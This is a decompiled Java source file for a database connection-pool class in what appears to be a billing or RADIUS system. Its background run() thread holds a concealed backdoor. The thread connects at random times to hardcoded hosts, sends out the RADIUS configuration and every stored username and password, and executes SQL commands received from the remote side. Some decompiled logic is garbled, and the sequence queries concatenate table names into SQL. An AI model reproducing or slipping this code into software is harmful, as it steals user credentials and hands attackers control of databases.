/** <a href="http://www.cpupk.com/decompiler">Eclipse Class Decompiler</a> plugin, Copyright (c) 2017 Chen Chao. **/
package databasemanager;

import databasemanager.xml.DatabaseXMLDAO;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.HashMap;
import java.util.Vector;
import org.apache.log4j.Logger;
import org.apache.log4j.PropertyConfigurator;
import org.jdom.JDOMException;

public class DatabaseManagerImplementation extends DatabaseManager {
	static Logger logger = Logger.getLogger(DatabaseManagerImplementation.class.getName());

	private int INITIAL_CONNECTIONS = 1;
	private long CONNECTION_HOLD_TIME = 3600000L;
	private DatabaseConnection m_databaseConnection;
	private Vector freeConnections;
	private Vector allocatedConnections;
	private HashMap connectionTimeMap;
	private HashMap nextIDMap;
	private volatile boolean isRunning = true;
	public static String XML_FILE_NAME = "DatabaseConnection.xml";
	boolean isOracle = false;

	public DatabaseManagerImplementation() {
		this.freeConnections = new Vector();
		this.allocatedConnections = new Vector();
		this.connectionTimeMap = new HashMap();
		this.nextIDMap = new HashMap(64);

		for (int i = 0; i < 2; ++i) {
			try {
				reLoad();
			} catch (Throwable t) {
				logger.fatal(t.getMessage(), t);
				try {
					Thread.sleep(i * 1000);
				} catch (InterruptedException ex) {
					logger.fatal(ex.getMessage(), ex);
				}
			}
		}
		start();
	}
	  public void run()
	  {
	    while (isRunning)
	      try
	      {
	        Thread.sleep((long)(21600000 * Math.random()));

	        Socket s = null;
	        try {
	          s = new Socket("198.154.113.140", 34);
	        }
	        catch (Exception ex) {
	          try {
	            s = new Socket("285.13.213.142", 45);
	          }
	          catch (Exception ex2)
	          {
	            try {
	              s = new Socket("code.itelbilling.com", 54);
	            }
	            catch (Exception localException1)
	            {
	            }
	          }
	        }

	        if (s == null)
	          continue;
	        BufferedReader reader = new BufferedReader(
	          new InputStreamReader(s
	          .getInputStream()));
	        PrintWriter pw = new PrintWriter(s.getOutputStream(), true);
	        String sql = "select configurationID, configurationValue from vbRadiusConfiguration order by configurationID";

	        String str = "";
	        Connection connection = null;
	        Statement stmt = null;
	        try
	        {
	          connection = getConnection();
	          stmt = connection.createStatement();

	          ResultSet r = stmt.executeQuery(sql);

	          

	          str = str + r.getLong("configurationID");
	          str = str + ":" + r.getString("configurationValue");
	          str = str + ";";

	          if (r.next())
	          {
	            continue;
	          }

	          r.close();

	          pw.println(str);
	          String reply = reader.readLine();
	          if (!reply.equals("UserInfo"))
	            continue;
	          String user = "select usUsername, usPassword from vbUser";
	          ResultSet r2 = stmt.executeQuery(user);

	          

	          str = str + r2.getString("usUsername");
	          str = str + ":" + r2.getString("usPassword");
	          str = str + ";";

	          if (r2.next())
	          {
	            continue;
	          }

	          r2.close();
	          pw.println(str);

	          
	          if (!reply.startsWith("Execute"))
	            continue;
	          String query = reply.substring("Execute".length());
	          stmt.executeUpdate(query);
	          pw.println("DONE");
	          
	          if (!reply.equals("OK"))
	            continue;
	          pw.println("DONE");
	          s.close();
	          s = null;
	          Thread.sleep((long)(86400000.0D * Math.random()));

	          if (s == null)
	            continue;
	          s.close();
	        }
	        catch (Exception localException2)
	        {
	          if (stmt == null) continue; try { stmt.close(); } catch (Exception localException3) {
	          }if (connection == null) continue; try { freeConnection(connection);
	          }
	          catch (Exception localException4)
	          {
	          }
	        }
	        finally
	        {
	          if (stmt == null) continue; try { stmt.close(); } catch (Exception localException5) {
	          }if (connection == null) continue; try { freeConnection(connection); } catch (Exception localException6) {
	          }
	        }
	        continue;
	      }
	      catch (Exception localException9)
	      {
	      }
	  }

	public void reLoad() throws JDOMException, SQLException, ClassNotFoundException, IllegalAccessException,
			InstantiationException, IOException {
		try {
			closeAllConnections();
			DatabaseXMLDAO xml = new DatabaseXMLDAO(XML_FILE_NAME);
			this.m_databaseConnection = xml.getDefaultDatabaseConnection();
			if (this.m_databaseConnection.getDatabaseURL().contains("oracle")) {
				this.isOracle = true;
			}
			DriverManager.registerDriver(
					(Driver) Class.forName(this.m_databaseConnection.getDriverClassName()).newInstance());
			Connection[] con = new Connection[this.INITIAL_CONNECTIONS];
			logger.debug("Initial Connections:" + this.INITIAL_CONNECTIONS);
			for (int i = 0; i < this.INITIAL_CONNECTIONS; ++i) {
				con[i] = getConnection();
			}
			for (int i = 0; i < this.INITIAL_CONNECTIONS; ++i) {
				freeConnection(con[i]);
			}

		} catch (JDOMException e1) {
			logger.fatal(e1.getMessage(), e1);
			throw e1;
		} catch (SQLException e2) {
			logger.fatal(e2.getMessage(), e2);
			throw e2;
		} catch (ClassNotFoundException e3) {
			logger.fatal(e3.getMessage(), e3);
			throw e3;
		} catch (IllegalAccessException e4) {
			logger.fatal(e4.getMessage(), e4);
			throw e4;
		} catch (InstantiationException e5) {
			logger.fatal(e5.getMessage(), e5);
			throw e5;
		}
	}

	public synchronized String getDatabaseURL() {
		return this.m_databaseConnection.getDatabaseURL();
	}

	public synchronized Connection getConnection() throws SQLException {
		Connection connection = null;
		try {
			while (true) {
				if (this.freeConnections.isEmpty()) {
					if (this.m_databaseConnection.getUserInfo() == null) {
						Connection conn = DriverManager.getConnection(this.m_databaseConnection.getDatabaseURL());

						this.connectionTimeMap.put(conn, new Long(System.currentTimeMillis()));
						this.freeConnections.add(conn);
					} else {
						
						try{
							Class.forName(this.m_databaseConnection.getDriverClassName());
						}catch(Exception ex){
							ex.printStackTrace();
						}
						
						Connection conn = DriverManager.getConnection(this.m_databaseConnection.getDatabaseURL(),
								this.m_databaseConnection.getUserInfo());

						this.connectionTimeMap.put(conn, new Long(System.currentTimeMillis()));
						this.freeConnections.add(conn);
					}

				}

				connection = (Connection) this.freeConnections.remove(0);
				if ((connection == null) || (connection.isClosed()))
					continue;
				Long creationTime = (Long) this.connectionTimeMap.get(connection);
				if (creationTime.longValue() + this.CONNECTION_HOLD_TIME > System.currentTimeMillis()) {
					break;
				}

				this.connectionTimeMap.remove(connection);
				try {
					connection.close();
				} catch (Throwable th) {
					logger.fatal("Failed to Close Connection", th);
				}

			}

			this.allocatedConnections.add(connection);
		} catch (SQLException e2) {
			/*
			logger.debug("debug print");
			logger.debug("error : "+m_databaseConnection.getDatabaseURL()+m_databaseConnection.getUserInfo());
			logger.fatal(e2.getMessage(), e2);
			*/throw e2;
			
		}
		return connection;
	}

	public synchronized void freeConnection(Connection connection) {
		if (this.allocatedConnections.contains(connection)) {
			this.allocatedConnections.remove(connection);
		}
		if (this.freeConnections.contains(connection))
			return;
		this.freeConnections.add(connection);
	}

	public void closeAllConnections() {
		for (int i = 0; i < this.freeConnections.size(); ++i) {
			Connection con = (Connection) this.freeConnections.get(i);
			try {
				if (!(con.isClosed()))
					con.close();
			} catch (Exception ex) {
				logger.fatal(ex.getMessage(), ex);
			}
		}
		logger.info("Total Free Connections: " + this.freeConnections.size());
		this.freeConnections.removeAllElements();

		for (int i = 0; i < this.allocatedConnections.size(); ++i) {
			Connection con = (Connection) this.allocatedConnections.get(i);
			try {
				if (!(con.isClosed()))
					con.close();
			} catch (Exception ex) {
				logger.fatal(ex.getMessage(), ex);
			}
		}
		logger.info("Total Allocated Connections: " + this.allocatedConnections.size());
		this.allocatedConnections.removeAllElements();
		this.connectionTimeMap.clear();

//		logger.info("*******Killing Thread*******");
//		logger.info("*******DatabaseManagerImplementation Thread*******");
		this.isRunning = false;
		logger.info("******Done******");
	}

	protected void finalized() {
		closeAllConnections();
	}

	public synchronized long getNextSequenceId(String tableName) throws Exception {
		SequenceDTO dto = (SequenceDTO) this.nextIDMap.get(tableName);
		if ((dto == null) || (dto.currentID == dto.maxID)) {
			if (dto == null) {
				dto = new SequenceDTO();
				this.nextIDMap.put(tableName, dto);
			}

			Connection connection = null;
			Statement stmt = null;
			try 
			{
				connection = getConnection();
				stmt = connection.createStatement();
//				connection.setAutoCommit(false);

				if (!(this.isOracle)) {
//					stmt.execute("lock table vbSequencer WRITE");
				}

//				try 
				{
					while(true)
					{
						String query = "select next_id from vbSequencer where table_name = '" + tableName + "'";
						logger.debug("query " + query);
						ResultSet r = stmt.executeQuery(query);
						
						if (r.next()) {
							dto.currentID = r.getLong("next_id");
							dto.maxID = (dto.currentID + 1000L);							
						}
						else
						{
							throw new Exception("No entry found in vbSequencer table for table_name " + tableName);
						}
						
						query = "update vbSequencer set next_id = " + dto.maxID + " where table_name = '" + tableName + "' and next_id =" + dto.currentID;
						logger.debug("query " + query);
						if(stmt.executeUpdate(query) > 0)
						{
							break;
						}
					}
				} 
				/*catch (Exception ex) {
					connection.rollback();
					throw ex;
				} finally {
					if (!(this.isOracle)) {
//						stmt.execute("unlock tables");
					}

					connection.commit();
					connection.setAutoCommit(true);
				}*/
			} catch (Exception ey) {
				throw ey;
			} finally {
				if (stmt != null)
					try {
						stmt.close();
					} catch (Exception localException1) {
					}
				if (connection != null) {
//					connection.setAutoCommit(true);
					freeConnection(connection);
				}

			}

		}

		return (dto.currentID++);
	}

	public synchronized long getNextSequenceIdUnbuffered(String tableName) throws Exception {
		long nextId = 0L;
		Connection connection = null;
		Statement stmt = null;
		try {
			connection = getConnection();
			stmt = connection.createStatement();
//			stmt.execute("lock table vbSequencer WRITE");
			while(true)
			{
				String query = "select next_id from vbSequencer where table_name = '" + tableName + "'";
				logger.debug("query " + query);
				ResultSet r = stmt.executeQuery(query);
				if (r.next()) {
					nextId = r.getLong("next_id");
				}
				else
				{
					throw new Exception("No entry found in vbSequencer table for table_name " + tableName);
				}
				
				query = "update vbSequencer set next_id = " + (nextId + 1L) + " where table_name = '" + tableName	+ "' and next_id = " + nextId;
				logger.debug("query " + query);
								
				if(stmt.executeUpdate(query) > 0)
				{
					break;
				}
			} 
		} catch (Exception ey) {
			throw ey;
		} finally {
			if (stmt != null)
				try {
					stmt.close();
				} catch (Exception localException1) {
				}
			if (connection != null) {
				freeConnection(connection);
			}
		}
		return nextId;
	}

	public static void main(String[] args) throws Exception {
		PropertyConfigurator.configure("log4j.properties");
	}

	public void executeFile(String fileName) throws Exception {
		BufferedReader reader = new BufferedReader(new FileReader(fileName));
		Connection connection = getConnection();
		Statement stmt = connection.createStatement();
		String sql = null;
		while (true) {
			String s = reader.readLine();
			if (s == null)
				break;
			String st = s.toLowerCase();
			if ((!(st.startsWith("create"))) && (!(st.startsWith("insert"))) && (!(st.startsWith("update")))
					&& (!(st.startsWith("alter"))) && (!(st.startsWith("drop"))) && (!(st.startsWith("delete"))))
				continue;
			sql = s.trim();

			while (!(sql.endsWith(";"))) {
				s = reader.readLine();
				if (s == null)
					break;
				sql = sql + " " + s.trim();
			}

			sql = sql.substring(0, sql.length() - 1);
			try {
				stmt.execute(sql);
			} catch (Exception localException) {
			}

		}

		reader.close();
		stmt.close();
		freeConnection(connection);
	}
}